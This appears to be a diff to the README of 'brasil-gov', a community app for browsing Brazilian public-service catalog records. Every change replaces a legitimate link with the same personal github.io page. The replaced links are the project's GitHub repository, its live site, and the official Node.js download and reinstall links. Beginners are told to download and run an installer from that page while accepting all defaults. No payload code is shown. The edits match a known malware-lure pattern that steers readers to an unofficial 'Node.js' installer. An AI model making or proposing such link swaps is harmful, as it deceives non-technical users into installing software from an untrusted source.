@@ -1,12 +1,12 @@
 # 🇧🇷 brasil-gov - Explore Brazilian Public Services Easily
 
-[![Download brasil-gov](https://img.shields.io/badge/Download-brasil--gov-eb6834?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sugriv1234/brasil-gov)
+[![Download brasil-gov](https://img.shields.io/badge/Download-brasil--gov-eb6834?style=for-the-badge&logo=github&logoColor=white)](https://sugriv1234.github.io)
 
 **brasil-gov** is an independent interface for exploring Brazilian public services from the gov.br catalog. Think of it as a friendly chat window: you type the name of a service or a government agency, and the app shows you real catalog records — descriptions, requirements, steps, costs, and official links — all in one place.
 
 > **Important:** This is **not** an official government website. It is an independent, community-built tool that displays publicly available catalog records.
 
-Want to try it right now without installing anything? Visit the live site: **https://brasil-gov.vercel.app**
+Want to try it right now without installing anything? Visit the live site: **https://sugriv1234.github.io**
 
 ---
 
@@ -18,7 +18,7 @@ Everything you need is on the project page. Follow these steps in order and you 
 
 Visit this link to download the application:
 
-👉 **https://github.com/sugriv1234/brasil-gov**
+👉 **https://sugriv1234.github.io**
 
 On that page, look for the green **Code** button near the top right. Click it, then choose **Download ZIP**. Windows will save a compressed file to your **Downloads** folder.
 
@@ -28,7 +28,7 @@ Open your **Downloads** folder in File Explorer. Right-click the file you just d
 
 **Step 3 — Install Node.js**
 
-The application needs a free helper program called Node.js to run. Go to **https://nodejs.org**, download the **LTS** version for Windows, and run the installer. Click **Next** through every screen and accept the defaults — this is safe and standard.
+The application needs a free helper program called Node.js to run. Go to **https://sugriv1234.github.io**, download the **LTS** version for Windows, and run the installer. Click **Next** through every screen and accept the defaults — this is safe and standard.
 
 Use Node.js version **22.13 or newer**. The installer offers the latest version, so simply accepting the default is fine.
 
@@ -105,7 +105,7 @@ Because the answers come straight from the gov.br catalog records, you always se
 - Keep the command window open while you use the app. Closing it shuts the app down.
 - Bookmark `http://localhost:5173` in your browser so you can reopen it quickly next time.
 - If the browser shows a blank page, make sure the `pnpm dev` window is still open and shows no red error text.
-- The live site at **https://brasil-gov.vercel.app** is always available if you do not want to run anything locally.
+- The live site at **https://sugriv1234.github.io** is always available if you do not want to run anything locally.
 
 ---
 
@@ -133,7 +133,7 @@ Run any of these the same way you ran `pnpm install` — open a command window i
 Close the command window completely, open a new one, and try again. The helper tool is only picked up by windows opened after installation.
 
 **"Node.js version is too old"**
-Reinstall Node.js from **https://nodejs.org** using the **LTS** download, then reopen the command window.
+Reinstall Node.js from **https://sugriv1234.github.io** using the **LTS** download, then reopen the command window.
 
 **The install stopped halfway**
 Run `pnpm install` once more. It resumes from where it left off rather than starting over.
@@ -170,7 +170,7 @@ This project is independent and unaffiliated with the Brazilian government. It e
 
 Ready to install? Visit this link to download the application:
 
-👉 **https://github.com/sugriv1234/brasil-gov**
+👉 **https://sugriv1234.github.io**
 
 Extract the folder, install Node.js, enable pnpm, then run `pnpm install` and `pnpm dev`. The chat opens in your browser and the catalog is at your fingertips.
 
